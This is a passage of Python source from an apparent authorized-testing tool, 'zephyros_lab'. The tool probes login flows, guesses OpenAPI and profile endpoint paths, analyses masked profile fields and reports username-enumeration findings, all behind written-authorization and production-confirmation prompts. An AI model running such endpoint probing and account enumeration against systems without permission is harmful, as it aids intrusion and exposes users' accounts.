            for line in fh:
                w = line.strip()
                if w and not w.startswith("#"):
                    d.add(w.lower())
    except OSError as e:
        LOG.log("warn", msg=f"dictionary load failed: {e}")
    return d


def load_word_priors(path: Optional[str]) -> Dict[str, float]:
    priors = dict(DEFAULT_WORD_PRIORS)
    if not path:
        return priors
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            for k, v in data.items():
                try:
                    priors[k.lower()] = float(v)
                except (TypeError, ValueError):
                    continue
    except (OSError, json.JSONDecodeError) as e:
        LOG.log("warn", msg=f"word priors load failed: {e}")
    return priors


def load_training_pairs(path: Optional[str]) -> List[dict]:
    if not path:
        return []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if not isinstance(data, list):
            raise LabToolError("training file must be JSON array")
        return data
    except FileNotFoundError:
        LOG.log("warn", msg=f"training file not found: {path}")
        return []
    except (json.JSONDecodeError, OSError, LabToolError) as e:
        LOG.log("warn", msg=f"training load failed: {e}")
        return []


def flatten_json(value: Any, prefix: str = "",
                 _seen: Optional[set] = None) -> Dict[str, Any]:
    out: Dict[str, Any] = {}
    seen = _seen if _seen is not None else set()
    if isinstance(value, dict):
        for k, v in value.items():
            kp = f"{prefix}.{k}" if prefix else str(k)
            if kp in seen:
                kp = f"{kp}#dup{len(seen)}"
            seen.add(kp)
            for sk, sv in flatten_json(v, kp, seen).items():
                if sk in out:
                    sk = f"{sk}#dup{len(out)}"
                out[sk] = sv
    elif isinstance(value, list):
        for i, v in enumerate(value):
            for sk, sv in flatten_json(v, f"{prefix}[{i}]", seen).items():
                if sk in out:
                    sk = f"{sk}#dup{len(out)}"
                out[sk] = sv
    else:
        out[prefix] = value
    return out


def parent_path(key: str) -> List[str]:
    parts = [p for p in re.split(r"[.\[\]]+", key)
             if p and not p.isdigit()]
    return parts[:-1] if parts else []


def extract_leaf_field_name(key: str) -> Optional[str]:
    parts = [p for p in re.split(r"[.\[\]]+", key)
             if p and not p.isdigit()]
    for p in reversed(parts):
        n = normalize_field_name(p)
        if n in ALLOWED_PROFILE_FIELDS:
            return n
    return None


def save_report(path: str, report: dict) -> None:
    try:
        p = Path(path)
        fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2, ensure_ascii=False)
        try:
            os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)
        except OSError:
            pass
        LOG.log("saved", msg=f"report -> {path}", path=path)
    except OSError as e:
        LOG.log("error", msg=f"report save failed: {e}")


@dataclass
class ProfileFinding:
    field: str
    parent: List[str]
    original_value: str
    classification: Classification
    masked: bool
    masked_token: Optional[str] = None
    mask_analyses: List[AnalyzerResult] = field(default_factory=list)
    decode_chains: List[List[DecodeChain]] = field(default_factory=list)
    plausibility: Optional[dict] = None
    id_structure: Optional[dict] = None

    def to_dict(self) -> dict:
        return {
            "field": self.field, "parent": self.parent,
            "original_value": self.original_value,
            "classification": self.classification.to_dict(),
            "masked": self.masked, "masked_token": self.masked_token,
            "mask_analyses": [a.to_dict() for a in self.mask_analyses],
            "decode_chains": [[c.to_dict() for c in chain]
                              for chain in self.decode_chains],
            "plausibility": self.plausibility,
            "id_structure": self.id_structure,
        }


def analyze_profile(profile_data: Any, analyzer: MaskPatternAnalyzer,
                    classifier: ObfuscationTechniqueClassifier,
                    known_values: Dict[str, str],
                    plausibility: Optional[SemanticPlausibility] = None
                    ) -> List[ProfileFinding]:
    plausibility = plausibility or SemanticPlausibility(analyzer.dictionary)
    flat = flatten_json(profile_data)
    findings: List[ProfileFinding] = []
    for key, value in flat.items():
        if not isinstance(value, str):
            continue
        short = extract_leaf_field_name(key)
        if short is None:
            continue
        field_type = ""
        for t, names in FIELD_TYPE_HINTS.items():
            if short in names:
                field_type = t
                break
        cls = classifier.classify(
            field=key, value=value,
            context={"training_available": bool(analyzer.learned_rules),
                     "field_type": field_type})
        masked = has_mask(value)
        finding = ProfileFinding(
            field=key, parent=parent_path(key),
            original_value=value, classification=cls, masked=masked)
        if masked:
            finding.masked_token = value
            finding.mask_analyses = analyzer.analyze(
                value, known_plaintext=known_values.get(short, ""),
                field_hint=field_type)
        finding.decode_chains = recursive_decode(value, max_depth=4)
        finding.plausibility = plausibility.analyze(value)
        for id_name, pat in ID_STRUCTURES.items():
            if pat.match(value):
                if id_name == "luhn":
                    valid = IDChecksum.luhn(value)
                elif id_name == "iban":
                    valid = IDChecksum.iban(value)
                else:
                    valid = None
                finding.id_structure = {
                    "type": id_name,
                    "checksum_verifiable": valid is not None,
                    "valid": valid}
                break
        findings.append(finding)
        LOG.log("field", level="verbose",
                msg=f"{key}: {cls.technique} "
                    f"(conf={cls.confidence:.2f}, masked={masked})",
                field=key, technique=cls.technique_id,
                confidence=cls.confidence, masked=masked)
    return findings


def login(client: AuthorizedClient, login_url: str, username: str,
          password: str, username_field: str, password_field: str,
          extra_payload: Optional[Dict[str, Any]] = None) -> dict:
    if not password:
        LOG.log("login_skipped", msg="no password; enumeration mode")
        return {"status": "skipped", "reason": "no_password"}
    LOG.log("login_start",
            msg=f"POST {redact_url_for_log(client.absolute_url(login_url))}")
    payload = {username_field: username, password_field: password}
    if extra_payload:
        payload.update(extra_payload)
    response = client.post_json(
        login_url, payload, allow_statuses=(401, 403))
    LOG.log("login_response", msg=f"HTTP {response.status_code}",
            status=response.status_code)
    if response.status_code not in (200, 201, 204):
        body_bytes = response.content or b""
        body_hash = hashlib.sha256(body_bytes[:200]).hexdigest()[:16]
        event = ("auth_failed" if response.status_code in (401, 403)
                 else "login_response")
        LOG.log(event,
                msg=f"login returned HTTP {response.status_code} "
                    f"body_sha256_16={body_hash}",
                status=response.status_code, body_sha256_16=body_hash)
        raise AuthRefusedError(
            f"login failed with HTTP {response.status_code} "
            f"body_sha256_16={body_hash}")
    try:
        body = response.json()
    except ValueError:
        body = {}
    tokens_present = []
    if isinstance(body, dict):
        for k in ("token", "access_token", "jwt", "api_key",
                  "refresh_token", "session_id"):
            if k in body and isinstance(body[k], str):
                tokens_present.append(k)
    return {"status": response.status_code,
            "tokens_present": tokens_present,
            "body_sha256_16": hashlib.sha256(
                (response.content or b"")[:200]).hexdigest()[:16]}


def fetch_json(client: AuthorizedClient, path: str,
               soft: bool = False) -> Tuple[Any, int]:
    r = client.get(path, soft=soft)
    try:
        return r.json(), r.status_code
    except ValueError:
        raise LabToolError(
            f"non-JSON response from {redact_url_for_log(path)}")


def fetch_repeated(client: AuthorizedClient, path: str,
                   times: int) -> List[Any]:
    out = []
    for _ in range(times):
        try:
            data, _ = fetch_json(client, path)
            out.append(data)
        except (LabToolError, GuardTriggeredError, ScopeViolationError):
            break
    return out


def validate_unauthenticated_access(client: AuthorizedClient,
                                    protected_path: str) -> dict:
    url = client.absolute_url(protected_path)
    bare = requests.Session()
    bare.headers.update({"User-Agent": AuthorizedClient._user_agent()})
    try:
        client._throttle()
        r = bare.get(url, timeout=client.timeout,
                     verify=client.verify_tls)
        status = r.status_code
        passed = status in (401, 403)
    except requests.RequestException as e:
        status = f"request_error: {type(e).__name__}"
        passed = False
    return {"test": "unauthenticated_access",
            "url": redact_url_for_log(url),
            "expected": "401 or 403", "actual": status,
            "passed": passed}


def fetch_robots(client: AuthorizedClient) -> Optional[str]:
    r = client.get_soft("/robots.txt")
    if r is None:
        return None
    if r.status_code == 200:
        return r.text[:8192]
    return None


def probe_openapi(client: AuthorizedClient) -> Optional[dict]:
    for path in ("/openapi.json", "/swagger.json", "/api-docs",
                 "/v3/api-docs", "/docs/openapi.json",
                 "/swagger/v1/swagger.json"):
        r = client.get_soft(path)
        if r is None or r.status_code != 200:
            continue
        ct = r.headers.get("content-type", "").lower()
        if "json" in ct or r.text.strip().startswith("{"):
            try:
                return r.json()
            except ValueError:
                continue
    return None


LOGIN_FIELD_CANDIDATES = {
    "username_field": ["email", "username", "user", "login",
                       "user_name", "login_name", "identifier",
                       "account", "email_address", "userid",
                       "user_id", "phone", "mobile"],
    "password_field": ["password", "pass", "passwd", "pwd",
                       "secret", "user_password"],
}


def discover_login_fields(openapi: Optional[dict]) -> Tuple[str, str]:
    uf, pf = "email", "password"
    if not openapi:
        return uf, pf
    try:
        for p, ops in (openapi.get("paths", {}) or {}).items():
            if not re.search(r"(login|signin|auth|token)", p, re.I):
                continue
            for op in ops.values():
                if not isinstance(op, dict):
                    continue
                content = op.get("requestBody", {}).get("content", {})
                schema = {}
                for spec in content.values():
                    schema = spec.get("schema", {}) or {}
                    break
                names = list((schema.get("properties", {}) or {}).keys())
                for cand in LOGIN_FIELD_CANDIDATES["username_field"]:
                    if cand in names:
                        uf = cand
                        break
                for cand in LOGIN_FIELD_CANDIDATES["password_field"]:
                    if cand in names:
                        pf = cand
                        break
                return uf, pf
    except Exception:
        pass
    return uf, pf


PROFILE_PATH_CANDIDATES = [
    "/api/me", "/api/user", "/api/profile", "/api/v1/me",
    "/api/v1/user", "/api/v1/profile", "/me", "/user", "/profile",
    "/account", "/api/account", "/api/users/me", "/api/v1/users/me",
    "/api/self", "/api/users/self", "/api/v2/me",
]


def discover_profile_path(client: AuthorizedClient,
                          openapi: Optional[dict]) -> Optional[str]:
    if openapi:
        try:
            for p in (openapi.get("paths") or {}):
                if re.search(r"(me|profile|self|account|user)", p, re.I):
                    if re.search(r"\{", p):
                        continue
                    return p
        except Exception:
            pass
    for path in PROFILE_PATH_CANDIDATES:
        r = client.get_soft(path)
        if r is None or r.status_code != 200:
            continue
        ct = r.headers.get("content-type", "").lower()
        if "json" not in ct:
            continue
        try:
            data = r.json()
            if isinstance(data, dict) and data:
                return path
        except ValueError:
            continue
    return None


def redact_sensitive_values(obj: Any) -> Any:
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            if (isinstance(k, str)
                    and SENSITIVE_VALUE_KEYS.search(k)
                    and not isinstance(v, (dict, list))):
                out[k] = "<redacted>"
            else:
                out[k] = redact_sensitive_values(v)
        return out
    if isinstance(obj, list):
        return [redact_sensitive_values(v) for v in obj]
    if isinstance(obj, str):
        return redact_string(obj)
    return obj


_EOF_WARNINGS = {"n": 0}


def _ask(prompt: str) -> str:
    while True:
        try:
            v = input(prompt).strip()
        except EOFError:
            print("\n[eof] aborted.", file=sys.stderr)
            sys.exit(EXIT_INTERRUPT)
        if v:
            return v
        print("required.")


def _ask_opt(prompt: str, default: str = "") -> str:
    try:
        v = input(prompt).strip()
    except EOFError:
        if _EOF_WARNINGS["n"] < 3:
            print(f"\n[eof] using default: {default!r}",
                  file=sys.stderr)
        _EOF_WARNINGS["n"] += 1
        return default
    return v or default


def _ask_float(prompt: str, default: float) -> float:
    v = _ask_opt(prompt, str(default))
    try:
        n = float(v)
        if n <= 0:
            raise ValueError
        return n
    except ValueError:
        return default


def _ask_int(prompt: str, default: int) -> int:
    v = _ask_opt(prompt, str(default))
    try:
        n = int(v)
        if n <= 0:
            raise ValueError
        return n
    except ValueError:
        return default


def _ask_yes_no(prompt: str, default: bool = False) -> bool:
    suffix = " [Y/n]: " if default else " [y/N]: "
    v = _ask_opt(prompt + suffix, "").lower()
    return default if not v else v in ("y", "yes")


def _ask_choice(prompt: str, choices: Sequence[str],
                default: str) -> str:
    print(f"{prompt} choices: {', '.join(choices)} (default {default})")
    v = _ask_opt("> ", default)
    return v if v in choices else default


def _ask_password_optional(prompt: str) -> str:
    try:
        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            p = getpass.getpass(prompt)
        if any(issubclass(w.category, getpass.GetPassWarning)
               for w in caught):
            print("[warn] password input may have echoed "
                  "(no TTY).", file=sys.stderr)
    except EOFError:
        return ""
    return p


def _ask_password_required(prompt: str) -> str:
    p = _ask_password_optional(prompt)
    if not p:
        print("password required.")
        sys.exit(EXIT_ERROR)
    return p


def prompt_with_cancel(prompt: str) -> str:
    v = _ask(prompt + " (or 'cancel') ")
    if v.lower() in ("cancel", "quit", "exit"):
        print("cancelled.")
        sys.exit(EXIT_INTERRUPT)
    return v


def _empty_config_defaults() -> dict:
    return dict(
        allowed_hosts=[], scope_file="", auth_headers={},
        auth_token_file="", username_field="", password_field="",
        secondary_username_field="", secondary_password_field="",
        json_out=False, no_color=False, dry_run=False,
        quiet=False, verbose=True, resume="",
        probe_auth_shape=False, autopilot=False,
        include_pii=False, enumeration=True,
        login_page="", client_side=True, client_out_dir="zephyros_out",
        client_max_scripts=20, no_node=False, generate_pause=True,
        account_recon=True,
    )

def _resolve_identifier_from_prompts() -> Identifier:
    raw = _ask(
        "Identifier (username / email / phone with country code) > ")
    t = detect_identifier_type(raw)
    country_hint = ""
    if t == "phone":
        if raw.startswith("+"):
            print(f"[identifier] phone (E.164): {raw}")
        else:
            normalized = normalize_phone(raw)
            if normalized:
                print(f"[identifier] phone (E.164 from country code): "
                      f"{normalized}")
            else:
                cc_raw = _ask_opt(
                    "Country code for phone "
                    "(e.g., BD, US, +880) [skip to use as-is] > ", "")
                country_hint = country_code_prompt_value(cc_raw)
                if country_hint:
                    normalized = normalize_phone(raw, country_hint)
                    if normalized:
                        print(f"[identifier] phone normalized: "
                              f"{normalized}")
                    else:
                        print("[identifier] warning: could not "
                              "normalize phone; using as-is")
                else:
                    print("[identifier] warning: phone not "
                          "normalized to E.164; may not match server")
    return make_identifier(raw, country_hint)


def autopilot_setup() -> dict:
    render_banner()
    base_url = normalize_base_url(
        prompt_with_cancel("Target base URL > "))
    login_page = _ask_opt(
        "Login page URL [default: base URL root] > ", base_url)
    identifier = _resolve_identifier_from_prompts()
    print(f"[autopilot] identifier type: {identifier.type}")
    print(f"[autopilot] identifier value: "
          f"{identifier.e164 or identifier.normalized}")
    password = _ask_password_optional(
        "Password [Enter to skip -> enumeration mode] > ")
    mode = "authenticated" if password else "enumeration"
    if not password:
        print("[autopilot] enumeration mode")
    env = detect_env_from_url(base_url)
    print(f"[autopilot] detected env: {env}")
    if env == "prod":
        if not _ask_yes_no(
                "Detected prod; confirm with explicit "
                "acknowledgement?", False):
            print("prod requires confirm.")
            sys.exit(EXIT_AUTH_REFUSED)
    if not _ask_yes_no(
            "Confirm you have written authorization to test this "
            "target?", False):
        print("authorization not acknowledged.")
        sys.exit(EXIT_AUTH_REFUSED)
    cfg = _empty_config_defaults()
    cfg.update(
        base_url=base_url, operator="autopilot", auth_ref="autopilot",
        env=env, identifier=identifier, password=password,
        login_username=identifier.raw,
        known_name="",
        known_email=(identifier.normalized
                     if identifier.type == "email" else ""),
        known_phone=(identifier.e164
                     if identifier.type == "phone" else ""),
        second_username="", second_password="",
        dictionary_path="", training_path="", eval_path="",
        rate=min(0.5, 0.1) if env == "prod" else 0.5,
        timeout=20, repeat_reads=5, guard_tolerance=1,
        max_requests=500, insecure_tls=False,
        report_path="authorized_lab_report.json",
        autopilot=True, mode=mode, login_page=login_page,
    )
    return cfg


def interactive_setup() -> dict:
    render_banner()
    base_url = normalize_base_url(
        prompt_with_cancel("Target base URL > "))
    login_page = _ask_opt(
        "Login page URL [default: base URL root] > ", base_url)
    if base_url.startswith("http://"):
        if not _ask_yes_no(
                "Plaintext HTTP detected; proceed anyway?", False):
            print("aborted: plaintext HTTP not authorized.")
            sys.exit(EXIT_SCOPE)
    operator = _ask_opt("Operator identity (optional) > ", "unknown")
    auth_ref = _ask_opt(
        "Authorization reference / ticket (optional) > ", "unspecified")
    if not _ask_yes_no(
            "Confirm written authorization to test this target?", False):
        print("authorization not acknowledged.")
        sys.exit(EXIT_AUTH_REFUSED)
    identifier = _resolve_identifier_from_prompts()
    password = _ask_password_optional(
        "Password [Enter to skip -> enumeration mode] > ")
    mode = "authenticated" if password else "enumeration"
    print(f"[interactive] mode: {mode}")
    client_side = _ask_yes_no(
        "Run client-side HTML/JS deobfuscation on login page?", True)
    client_out_dir = _ask_opt(
        "Client-side output directory [zephyros_out] > ",
        "zephyros_out")
    client_max_scripts = _ask_int(
        "Max external scripts to fetch [20] > ", 20)
    no_node = not _ask_yes_no(
        "Enable Node AST bridge (requires node + @babel/parser)?",
        True)
    generate_pause = _ask_yes_no(
        "Generate pause-before-transmit instrumentation?", True)
    account_recon = _ask_yes_no(
        "Run account recon (public profile + login flow)?", True)
    known_name = _ask_opt("Known name (optional) > ", "")
    known_email = _ask_opt(
        "Known email (optional) > ",
        identifier.normalized if identifier.type == "email" else "")
    known_phone = _ask_opt(
        "Known phone (optional) > ",
        identifier.e164 or "" if identifier.type == "phone" else "")
    second_username = _ask_opt(
        "Second account username (optional, enables role diff) > ", "")
    second_password = ""
    if second_username:
        second_password = _ask_password_required(
            "Second account password > ")
    dictionary_path = _ask_opt("Dictionary file (optional) > ", "")
    training_path = _ask_opt("Training pairs JSON (optional) > ", "")
    eval_path = _ask_opt("Evaluation pairs JSON (optional) > ", "")
    resume_path = _ask_opt(
        "Resume from training pairs JSON (optional) > ", "")
    allowed_hosts_raw = _ask_opt(
        "Allowed hosts (comma-separated, optional) > ", "")
    scope_file = _ask_opt("Scope file JSON (optional) > ", "")
    rate = _ask_float("Requests per second [0.5] > ", 0.5)
    timeout = _ask_int("Timeout seconds [20] > ", 20)
    repeat_reads = _ask_int("Repeated reads [5] > ", 5)
    guard_tolerance = _ask_int("Guard tolerance [1] > ", 1)
    max_requests = _ask_int("Max requests [500] > ", 500)
    insecure = _ask_yes_no(
        "Disable TLS verification (lab only)?", False)
    enumeration = _ask_yes_no(
        "Run enumeration probes (login diff, forgot-password, etc.)?",
        True)
    probe_shape = _ask_yes_no(
        "Probe login error shape before login? (extra request)", False)
    env = _ask_choice("Environment:", ["lab", "staging", "prod"],
                      detect_env_from_url(base_url))
    if env == "prod":
        if not _ask_yes_no("Really target PROD?", False):
            print("prod requires explicit confirm.")
            sys.exit(EXIT_AUTH_REFUSED)
        rate = min(rate, 0.1)
    report_path = _ask_opt(
        "Report path [authorized_lab_report.json] > ",
        "authorized_lab_report.json")
    include_pii = _ask_yes_no(
        "Include PII values in report? (default redacted)", False)
    print("\n[setup summary]")
    print(f"  target          : {base_url}")
    print(f"  login page      : {login_page}")
    print(f"  identifier      : {identifier.type}")
    print(f"  mode            : {mode}")
    print(f"  account recon   : {account_recon}")
    print(f"  client-side     : {client_side} "
          f"(out={client_out_dir}, scripts<={client_max_scripts})")
    print(f"  node AST bridge : {not no_node}")
    print(f"  pause generator : {generate_pause}")
    print(f"  operator        : {operator}")
    print(f"  auth reference  : {auth_ref}")
    print(f"  env             : {env}")
    print(f"  rate            : {rate}/s")
    print(f"  repeats         : {repeat_reads}")
    print(f"  enumeration     : {enumeration}")
    print(f"  second account  : "
          f"{'yes' if second_username else 'no'}")
    print(f"  allowed hosts   : {allowed_hosts_raw or '<origin>'}")
    print(f"  scope file      : {scope_file or '<none>'}")
    print(f"  report          : {report_path}")
    print(f"  include PII     : {include_pii}")
    if not _ask_yes_no("Proceed?", True):
        print("cancelled.")
        sys.exit(EXIT_INTERRUPT)
    cfg = _empty_config_defaults()
    cfg.update(
        base_url=base_url, operator=operator, auth_ref=auth_ref,
        env=env, identifier=identifier, password=password,
        login_username=identifier.raw,
        known_name=known_name, known_email=known_email,
        known_phone=known_phone,
        second_username=second_username,
        second_password=second_password,
        dictionary_path=dictionary_path, training_path=training_path,
        eval_path=eval_path, rate=rate, timeout=timeout,
        repeat_reads=repeat_reads, guard_tolerance=guard_tolerance,
        max_requests=max_requests, insecure_tls=insecure,
        report_path=report_path, include_pii=include_pii,
        allowed_hosts=[h.strip() for h in allowed_hosts_raw.split(",")
                       if h.strip()],
        scope_file=scope_file, resume=resume_path,
        probe_auth_shape=probe_shape, enumeration=enumeration,
        mode=mode, login_page=login_page, client_side=client_side,
        client_out_dir=client_out_dir,
        client_max_scripts=client_max_scripts,
        no_node=no_node, generate_pause=generate_pause,
        account_recon=account_recon,
    )
    return cfg


def build_argparser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="zephyros_lab",
        description=("Account recon + login flow probe + "
                     "client-side deobfuscation. "
                     "Lab / CTF / bug bounty use only."))
    p.add_argument("--version", action="version",
                   version=f"zephyros_lab {VERSION}")
    p.add_argument("--interactive", action="store_true")
    p.add_argument("--autopilot", action="store_true")
    p.add_argument("--self-test", action="store_true")
    p.add_argument("--pause-only", action="store_true")
    p.add_argument("--base-url")
    p.add_argument("--login-page")
    p.add_argument("--identifier")
    p.add_argument("--username")
    p.add_argument("--email")
    p.add_argument("--phone")
    p.add_argument("--country-code")
    p.add_argument("--password")
    p.add_argument("--login-url")
    p.add_argument("--profile-url")
    p.add_argument("--username-field", default="")
    p.add_argument("--password-field", default="")
    p.add_argument("--known-name", default="")
    p.add_argument("--known-email", default="")
    p.add_argument("--known-phone", default="")
    p.add_argument("--secondary-username", default="")
    p.add_argument("--secondary-password", default="")
    p.add_argument("--secondary-username-field", default="")
    p.add_argument("--secondary-password-field", default="")
    p.add_argument("--dictionary")
    p.add_argument("--word-priors")
    p.add_argument("--training")
    p.add_argument("--evaluate")
    p.add_argument("--eval-with-known", action="store_true")
    p.add_argument("--rate", type=float, default=0.5)
    p.add_argument("--timeout", type=int, default=20)
    p.add_argument("--insecure-tls", action="store_true")
    p.add_argument("--allow-plaintext", action="store_true")
    p.add_argument("--repeat-reads", type=int, default=5)
    p.add_argument("--guard-tolerance", type=int, default=1)
    p.add_argument("--max-requests", type=int, default=500)
    p.add_argument("--allowed-hosts", default="")
    p.add_argument("--scope-file", default="")
    p.add_argument("--auth-header", action="append", default=[])
    p.add_argument("--auth-token-file", default="")
    p.add_argument("--operator", default="unknown")
    p.add_argument("--authorization-reference", default="unspecified")
    p.add_argument("--env", choices=["lab", "staging", "prod"],
                   default="lab")
    p.add_argument("--confirm-prod", action="store_true")
    p.add_argument("--report", default="authorized_lab_report.json")
    p.add_argument("--include-pii", action="store_true")
    p.add_argument("--redact-report", action="store_true")
    p.add_argument("--no-enumeration", action="store_true")
    p.add_argument("--client-side", action="store_true", default=True)
    p.add_argument("--no-client-side", action="store_false",
                   dest="client_side")
    p.add_argument("--client-out-dir", default="zephyros_out")
    p.add_argument("--client-max-scripts", type=int, default=20)
    p.add_argument("--no-node", action="store_true")
    p.add_argument("--no-pause", action="store_true")
    p.add_argument("--account-recon", action="store_true", default=True)
    p.add_argument("--no-account-recon", action="store_false",
                   dest="account_recon")
    p.add_argument("--json-out", action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--probe-auth-shape", action="store_true")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--verbose", action="store_true", default=True)
    p.add_argument("--no-verbose", action="store_false", dest="verbose")
    p.add_argument("--resume", default="")
    p.add_argument("--i-have-written-authorization",
                   action="store_true")
    return p


def _parse_headers(items: Sequence[str]) -> Dict[str, str]:
    out = {}
    for item in items:
        if ":" in item:
            k, v = item.split(":", 1)
            k = k.strip()
            if k:
                out[k] = v.strip()
            else:
                print(f"[warn] ignoring invalid auth-header: {item!r}",
                      file=sys.stderr)
        else:
            print(f"[warn] ignoring auth-header without ':': {item!r}",
                  file=sys.stderr)
    return out


def _resolve_identifier_from_args(args) -> Optional[Identifier]:
    provided = [("identifier", args.identifier),
                ("username", args.username),
                ("email", args.email),
                ("phone", args.phone)]
    non_empty = [(n, v) for n, v in provided if v]
    if len(non_empty) > 1:
        print("[stop] only one of "
              "--identifier/--username/--email/--phone")
        sys.exit(EXIT_ERROR)
    if not non_empty:
        return None
    _, raw = non_empty[0]
    try:
        return make_identifier(raw, args.country_code or "")
    except IdentifierError as e:
        print(f"[stop] invalid identifier: {e}")
        sys.exit(EXIT_ERROR)


def config_from_args(args) -> dict:
    if args.pause_only:
        return dict(
            pause_only=True,
            base_url=normalize_base_url(args.base_url or
                                         args.login_page or "about:blank"),
            login_page=args.login_page or args.base_url or "",
            client_out_dir=args.client_out_dir,
        )
    if not args.i_have_written_authorization and not args.evaluate:
        print("[stop] --i-have-written-authorization required.")
        sys.exit(EXIT_AUTH_REFUSED)
    if not args.evaluate and not args.base_url:
        print("[stop] --base-url required.")
        sys.exit(EXIT_ERROR)
    if args.env == "prod" and not args.confirm_prod:
        print("[stop] prod requires --confirm-prod.")
        sys.exit(EXIT_AUTH_REFUSED)
    base_url = (normalize_base_url(args.base_url)
                if args.base_url else "")
    if base_url.startswith("http://") and not args.allow_plaintext:
        print("[stop] plaintext HTTP requires --allow-plaintext.")
        sys.exit(EXIT_SCOPE)
    identifier = _resolve_identifier_from_args(args)
    if not args.evaluate and identifier is None:
        print("[stop] one of "
              "--identifier/--username/--email/--phone required")
        sys.exit(EXIT_ERROR)
    include_pii = bool(args.include_pii) and not bool(args.redact_report)
    mode = "authenticated" if args.password else "enumeration"
    cfg = _empty_config_defaults()
    cfg.update(
        base_url=base_url, login_url=args.login_url or "",
        profile_url=args.profile_url or "",
        operator=args.operator, auth_ref=args.authorization_reference,
        env=args.env,
        rate=min(args.rate, 0.1) if args.env == "prod" else args.rate,
        identifier=identifier, password=args.password or "",
        login_username=identifier.raw if identifier else "",
        known_name=args.known_name,
        known_email=(args.known_email or
                     (identifier.normalized
                      if identifier and identifier.type == "email"
                      else "")),
        known_phone=(args.known_phone or
                     (identifier.e164
                      if identifier and identifier.type == "phone"
                      else "")),
        second_username=args.secondary_username,
        second_password=args.secondary_password,
        dictionary_path=args.dictionary, training_path=args.training,
        eval_path=args.evaluate, timeout=args.timeout,
        repeat_reads=args.repeat_reads,
        guard_tolerance=args.guard_tolerance,
        max_requests=args.max_requests,
        insecure_tls=args.insecure_tls,
        allowed_hosts=[h.strip()
                       for h in args.allowed_hosts.split(",")
                       if h.strip()],
        scope_file=args.scope_file,
        auth_headers=_parse_headers(args.auth_header),
        auth_token_file=args.auth_token_file,
        username_field=args.username_field,
        password_field=args.password_field,
        secondary_username_field=args.secondary_username_field,
        secondary_password_field=args.secondary_password_field,
        report_path=args.report, include_pii=include_pii,
        enumeration=not args.no_enumeration,
        json_out=args.json_out, no_color=args.no_color,
        dry_run=args.dry_run, quiet=args.quiet,
        verbose=args.verbose, resume=args.resume,
        probe_auth_shape=args.probe_auth_shape, mode=mode,
        login_page=args.login_page or base_url,
        client_side=args.client_side,
        client_out_dir=args.client_out_dir,
        client_max_scripts=args.client_max_scripts,
        no_node=args.no_node,
        generate_pause=not args.no_pause,
        account_recon=args.account_recon,
    )
    return cfg


def load_scope_file(path: str) -> Dict[str, Any]:
    if not path:
        return {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, json.JSONDecodeError) as e:
        LOG.log("warn", msg=f"scope file load failed: {e}")
        return {}


def dependency_versions() -> Dict[str, str]:
    out = {}
    if _md is None:
        return out
    for pkg in ("requests", "urllib3", "certifi", "charset-normalizer"):
        try:
            out[pkg] = _md.version(pkg)
        except Exception:
            out[pkg] = "unknown"
    return out


def install_signal_handlers(state: dict) -> Dict[int, Any]:
    prev: Dict[int, Any] = {}

    def handler(signum, frame):
        state["interrupted"] = True
        try:
            LOG.log("stop",
                    msg=f"signal {signum} received; writing report.")
        except Exception:
            pass
        raise KeyboardInterrupt

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            prev[sig] = signal.getsignal(sig)
            signal.signal(sig, handler)
        except (ValueError, OSError):
            pass
    return prev


def restore_signal_handlers(prev: Dict[int, Any]) -> None:
    for sig, handler in prev.items():
        try:
            signal.signal(sig, handler)
        except (ValueError, OSError):
            pass


def build_technique_contracts(report: dict) -> Dict[str, Dict[str, Any]]:
    attempts = set(report.get("techniques_attempted", []))
    detected_ids = set()
    for finding in report.get("profile_findings", []):
        tid = finding.get("classification", {}).get("technique_id")
        if tid:
            detected_ids.add(tid)
    contracts: Dict[str, Dict[str, Any]] = {}
    for tid, name in TECHNIQUE_NAMES.items():
        detected = tid in detected_ids
        attempted = (tid in attempts
                     or any(tid in a for a in attempts)
                     or detected)
        contracts[tid] = {"name": name, "detected": detected,
                          "attempted": attempted}
    extra = {
        "dynamic_data_masking": "Dynamic data masking",
        "shuffle": "Shuffling",
        "deterministic_masking": "Deterministic masking",
        "k_anonymity": "K-anonymity",
        "l_diversity": "l-diversity",
        "t_closeness": "t-closeness",
        "differential_privacy_noise": "Differential privacy / noise",
        "quantile_binning": "Quantile binning",
        "zkp_fingerprint": "ZKP fingerprint (passive)",
        "homomorphic_fingerprint": "Homomorphic fingerprint (passive)",
        "smpc_fingerprint": "SMPC fingerprint (passive)",
        "enumeration_login_diff":
            "Username enumeration via login diff",
        "enumeration_forgot_password":
            "Username enumeration via forgot-password",
        "enumeration_check_endpoint":
            "Username enumeration via check endpoint",
        "enumeration_public_profile":
            "Username enumeration via public profile",
        "client_js_obfuscation":
            "Client-side JS obfuscation",
        "client_html_obfuscation":
            "Client-side HTML obfuscation",
        "client_skimmer":
            "Client-side skimmer/credential-exfil flow",
        "client_phishing":
            "Client-side phishing form",
        "account_recon":
            "Account recon (public profile + visibility + ID shape)",
        "login_field_required":
            "Login field requirements",
        "login_obfuscated_response":
            "Login response obfuscation",
        "forgot_password_obfuscated":
            "Forgot-password response obfuscation",
    }
    cs = report.get("client_side", {}) or {}
    cs_enabled = cs.get("enabled", False)
    cs_js = cs.get("js_findings", {}) or {}
    cs_html = cs.get("html_findings", {}) or {}
    cs_skimmer = cs.get("skimmer_hits", []) or []
    cs_phish = cs.get("phishing_hits", []) or []
    recon = report.get("account_recon") or {}
    lf = report.get("login_flow") or {}
    for tid, name in extra.items():
        detected = False
        if tid == "dynamic_data_masking":
            detected = (report.get("role_diff", {})
                              .get("verdict", "")
                        == "role_based_masking_likely")
        if tid == "deterministic_masking":
            detected = any(
                isinstance(v, dict)
                and v.get("verdict") == "deterministic_masking_likely"
                for v in report.get("differential", {}).values())
        if tid == "shuffle":
